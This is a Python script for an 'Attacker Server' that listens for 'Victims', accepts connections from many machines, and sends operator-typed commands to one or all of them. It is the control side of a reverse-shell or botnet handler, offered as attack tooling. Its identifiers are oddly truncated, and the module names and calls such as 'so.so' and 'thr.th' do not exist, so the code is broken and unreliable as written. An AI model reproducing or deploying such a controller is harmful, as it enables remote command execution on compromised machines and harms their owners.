import so
import thr

class A:
  def __init__(s, a, p):
    s.h_i = a
    s.h_p = p
    s.s = None
    s.c = []

  def s_c(s):
    print("####################################")
    print("######### Attacker Server #########")
    print("####################################")

    s.s = so.so(so.AF_INET, so.SOCK_STREAM)
    s.s.bind((s.h_i, s.h_p))

    print("Msg: Server Initiated...")
    print("Msg: Listening for Victims")

    s.s.listen(5)

    while True:
      c_s, c_a = s.s.accept()
      print("Msg: Received Connection from", c_a)
      s.c.append((c_s, c_a))
      c_h = thr.th(target=s.h_c, args=(c_s,))
      c_h.start()

  def h_c(s, c_s):
    while True:
      i = '[+] ' + str(c_s.getpeername()[0]) + " :sh$ "
      c = input(i)

      if not c.strip():
        continue

      if c.lower() == "exit":
        c_s.close()
        s.c.remove((c_s, None))
        print("Msg: Connection closed")
        break

      if c.lower() == "list":
        print("Connected Devices:")
        for i, (c, a) in enumerate(s.c, start=1):
          print(f"{i}. {a[0]}")

      elif c.startswith("sendto"):
        p = c.split(" ", 1)
        if len(p) == 2:
          try:
            d_i = int(p[1]) - 1
            t_s, _ = s.c[d_i]
            t_c = input("Enter command to send: ")
            t_s.send(t_c.encode())
          except (ValueError, IndexError):
            print("Invalid device index.")
        else:
          print("Usage: sendto <device_index>")

      else:
        for c_s, _ in s.c:
          c_s.send(c.encode())

  def c_c(s):
    for c_s, _ in s.c:
      c_s.close()
    s.c = []

if __name__ == "__main__":
  a_i = '127.0.0.1'
  a_p = 4000

  a_s = A(a_i, a_p)
  a_s.s_c()
